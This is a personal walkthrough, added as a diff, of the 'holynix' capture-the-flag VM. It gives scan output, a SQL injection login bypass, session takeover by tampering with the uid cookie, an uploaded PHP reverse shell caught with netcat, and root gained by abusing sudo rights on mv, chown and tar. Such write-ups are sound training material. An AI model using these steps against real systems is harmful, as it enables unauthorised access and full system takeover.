@@ -1,0 +1,139 @@
+holynix_v1
+time taken: 2 1/2 hours
+
+nmap:
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-09 22:10 MDT
+Warning: 212.129.28.18 giving up on port because retransmission cap hit (2).
+Nmap scan report for ctf01.root-me.org (212.129.28.18)
+Host is up (0.14s latency).
+Not shown: 994 closed ports
+PORT    STATE    SERVICE      VERSION
+22/tcp  open     ssh          OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 65:3a:85:f2:b2:e5:5d:b4:68:8f:1e:8b:1f:cf:9d:fe (DSA)
+|_  2048 03:73:de:c7:17:96:0b:bb:8c:8e:c7:87:9b:5b:d5:c9 (RSA)
+25/tcp  filtered smtp
+80/tcp  open     http         Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
+|_http-title: Site doesn't have a title (text/html).
+135/tcp filtered msrpc
+139/tcp filtered netbios-ssn
+445/tcp filtered microsoft-ds
+Device type: general purpose|printer
+Running (JUST GUESSING): QEMU (96%), Konica Minolta embedded (88%), GNU Hurd (87%)
+OS CPE: cpe:/a:qemu:qemu cpe:/h:konicaminolta:7035 cpe:/o:gnu:hurd
+Aggressive OS guesses: QEMU user mode network gateway (96%), Konica Minolta 7035 printer (88%), GNU Hurd 0.3 (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.12 ms 10.0.2.2
+2   0.32 ms ctf01.root-me.org (212.129.28.18)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.87 seconds
+
+uniscan:
+
+===================================================================================================
+| Domain: http://ctf01.root-me.org/
+| Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
+| IP: 212.129.28.18
+===================================================================================================
+|
+| Directory check:
+| [+] CODE: 200 URL: http://ctf01.root-me.org/calender/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/footer/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/home/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/icons/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/img/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/index/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/login/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/misc/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/upload/
+===================================================================================================
+|                                                                                                   
+| File check:
+| [+] CODE: 200 URL: http://ctf01.root-me.org/home.php
+| [+] CODE: 200 URL: http://ctf01.root-me.org/index.php
+| [+] CODE: 200 URL: http://ctf01.root-me.org/login.php
+===================================================================================================
+|
+| Check robots.txt:
+|
+| Check sitemap.xml:
+===================================================================================================
+|
+| Crawler Started:
+| Plugin name: Upload Form Detect v.1.1 Loaded.
+| Plugin name: Code Disclosure v.1.1 Loaded.
+| Plugin name: FCKeditor upload test v.1 Loaded.
+| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+| Plugin name: phpinfo() Disclosure v.1 Loaded.
+| Plugin name: External Host Detect v.1.2 Loaded.
+| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
+| Plugin name: E-mail Detection v.1.1 Loaded.
+| [+] Crawling finished, 10 URL's found!
+|
+| E-mails:
+| [+] E-mail Found: mike@hyperreal.org
+| [+] E-mail Found: kevinh@kevcom.com
+|
+| SQL Injection:
+| [+] Vul [SQL-i] http://ctf01.root-me.org/index.php?page=login.php               
+| Post data: &user_name=123&password=123'&Submit_button=123               
+
+sql injection at http://ctf01.root-me.org/index.php?page=login.php with good old ' or 1=1 # in password field let's us login as "alamo"
+
+interesting "upload" section. time to upload shell
+
+"cannot upload to home directory" though...
+
+chaning the "uid" cookie to 1, 2, 3, etc gives us the sessions of the different users
+
+setting uid to 3 ( complete guess, gmckinnon ) allows for the file to be uploaded. uploaded php-reverse-shell.php, naturally.
+
+go to http://ctf01.root-me.org/~gmckinnon/php-reverse-shell.php to see uploads
+
+root@kdog:~#  nc -nvlp 4448
+Listening on [0.0.0.0] (family 0, port 4448)
+Connection from [212.129.28.18] port 4448 [tcp/*] accepted (family 2, sport 47089)
+Linux holynix 2.6.24-26-server #1 SMP Tue Dec 1 19:19:20 UTC 2009 i686 GNU/Linux
+ 10:53:17 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: can't access tty; job control turned off
+
+immediatelty go for vmsplice as linux kernel is 2.6.24... DID NOT WORK.
+
+I really need to develop a more sophisticated method of rooting rather than relying on uploading
+exploits like a mandman until I find one that works.
+
+$ sudo -l
+User www-data may run the following commands on this host:
+    (root) NOPASSWD: /bin/chown
+    (root) NOPASSWD: /bin/chgrp
+    (root) NOPASSWD: /bin/tar
+    (root) NOPASSWD: /bin/mv
+
+
+so we can use these four commands as non-root!
+
+EVENTUALLY:
+1. copy /bin/bash to /tmp/ so we can actually touch it
+2. change the permissions, with sudo, of /tmp/bash to root
+3. (sudo) move the newly copied bash to /bin/tar, which we also have sudo permissions of.
+4. run /bin/tar (which now contains a rooted version of bash), and get root:
+(downside: cannot tar now, but who gives a shit we are root)
+
+$ cp /bin/bash .
+$ sudo chown root:root /tmp/bash
+$ sudo /bin/mv /tmp/bash /bin/tar
+$ sudo /bin/tar
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
